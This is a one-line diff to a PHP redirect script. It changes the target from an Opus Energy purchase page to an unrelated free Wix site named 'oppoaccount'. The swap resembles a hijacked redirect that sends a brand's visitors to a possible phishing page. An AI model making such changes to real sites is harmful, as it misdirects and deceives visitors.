@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.opusenergy.com/buy-energy/");
+header("Location: https://oppoaccount.wixsite.com/mysite");
 die();
 ?>
